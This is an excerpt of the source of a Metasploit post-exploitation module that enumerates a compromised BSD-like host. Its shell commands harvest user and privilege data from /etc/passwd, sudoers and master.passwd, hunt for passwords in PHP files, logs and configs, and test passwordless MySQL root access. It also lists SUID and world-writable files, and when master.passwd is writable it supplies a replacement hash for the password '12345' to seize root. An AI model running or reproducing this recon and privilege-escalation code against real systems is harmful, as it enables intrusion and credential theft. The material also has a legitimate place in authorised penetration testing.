...
class MetasploitModule < Msf::Post
  ...
  def basic_info
    ...
    output << get("CPU Info", "grep -i cpu /var/run/dmesg.boot")
  ...
  def tools_info
    ...
    output << execute("/bin/sh -c \"which awk perl python ruby gcc g++ vi vim nano nmap find netcat nc ncat wget tftp ftp tcpdump 2>/dev/null\"")
    output << "\n"
    output << get("GIT Directories", "/bin/sh -c \"find / \\( -type d -name '.git' \\) -exec ls -ld {} \\; 2>/dev/null\"")
    return output
  end
  ...
  def network_info
    ...
    output << get("Netstat", "netstat -an | grep -v 'TIME_WAIT' | grep -v 'CLOSE_WAIT'")
    output << get("Route", "netstat -rn")
    output << get("Iptables", "/bin/sh -c \"iptables -L 2>/dev/null\"")
    return output
  end
  ...
  def filesystem_info
    ...
    output << get("Scheduled cron jobs", "/bin/sh -c \"ls -la /etc/cron* 2>/dev/null\"")
    output << get("Crontab for current user", "crontab -l")
    output << get("Writable cron dirs", "/bin/sh -c \"ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null\"")
    return output
  end

  def userenv_info
    output = "\n[*] USER AND ENVIRONMENTAL INFO:\n"
    output << get("Logged in User Activity", "/bin/sh -c \"w 2>/dev/null\"")
    output << get("Super Users Found:", "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'")
    output << get("Environment", "/bin/sh -c \"env 2>/dev/null | grep -v 'LS_COLORS\"")
    output << get("Root and Current User History (depends on privs)", "/bin/sh -c \"ls -la ~/.history; ls -la /root/.history 2>/dev/null\"")
    output << get_file_grep("Sudoers (privileged)", "/etc/sudoers", "#", true)
    output << get_file("All Users", "/etc/passwd")
    output << get_file_grep("User With Potential Login Rights", "/etc/passwd", "/bin/csh")
  ...
  def file_dir_perms
    ...
    output << get("Protected Files", "ls -al /etc/passwd; ls -al /etc/master.passwd; ls -al /etc/group")
    output << get("Logfile Permissions", "/bin/sh -c \"ls -al /var/log/syslog 2>/dev/null; ls -al /var/log/auth.log 2>/dev/null\"")
    output << get("World Writeable Directories for User/Group 'Root'", "/bin/sh -c \"find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep root\"")
    output << get("World Writeable Directories for Users other than Root", "/bin/sh -c \"find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root\"")
    output << get("World Writable Files", "/bin/sh -c \"find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null\"")
    output << get("Checking if root's home folder is accessible", "/bin/sh -c \"ls -ahlR /root 2>/dev/null\"")
    output << suid_files
    output << get("SGID Files and Directories", "/bin/sh -c \"find / \\( -perm -2000 \\) -exec ls -ld {} \\; 2>/dev/null\"")
    return output
  end

  def proc_aps_info
    output = "\n[*] PROCESSES AND APPLICATIONS:\n"
    output << get("Enabled Services", "service -e")
    output << get("Current processes", "ps aux | awk '{print $1,$2,$9,$10,$11}'")
    output << get("Apache Version and Modules", "/bin/sh -c \"apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l 2>/dev/null\"")
    return output
  end
  ...
  def extra_info
    ...
    output << get("Listing other home folders", "/bin/sh -c \"ls -ahlR /home 2>/dev/null\"")
    output << files_owned_users
    output << get("PHP Files Containing Keyword: 'password'", "/bin/sh -c \"find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null\"")
    output << get("Logs Containing Keyword: 'password'", "/bin/sh -c \"find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null\"")
    output << get("Config Files Containing Keyword: 'password'", "/bin/sh -c \"find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null\"")
    return output
  end
  ...
  def files_owned(user)
    return get("Files Owned by #{user}", "/bin/sh -c \"find / -user #{user} -type f -size +0M -ls 2>/dev/null\"")
  end

  def files_owned_users
    output = "\n[*] Files containing data owned by users other than root\n"
    initial_list = file_read_grep("/etc/passwd", "/bin/csh")
  ...
  def suid_files
    output = ""
    files = execute("/bin/sh -c \"find / \\( -perm -4000 \\) -exec ls -al {} \\; 2>/dev/null\"")
    return "" unless files
    files = files.split("\n")
    files.each do |file|
  ...
  def world_writeable(file_name)
    result = execute("/bin/sh -c \"ls -al #{file_name} 2>/dev/null | awk '$1 ~ /^........w./'\"")
  ...
  def mysql_nopass
    output = ""
    result = execute("/bin/sh -c \"mysql -uroot -e 'show databases;' 2>/dev/null\"")
  ...
  def world_writable_shadow
    output = ""
    result = world_writeable("/etc/master.passwd")
    if result
      print_good("QUICKFAIL!: /etc/master.passwd is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/master.passwd is world writable!\n"
      output << format(result)
      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/master.passwd!!! Is /etc/master.passwd readable?\n"
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
  ...
  def readable_shadow
    output = ""
    result = file_read("/etc/master.passwd")
    if result
      print_good("QUICKFAIL!: /etc/master.passwd is readable!")
      output << "\n[+] QUICKFAIL!: /etc/master.passwd is readable!\n"
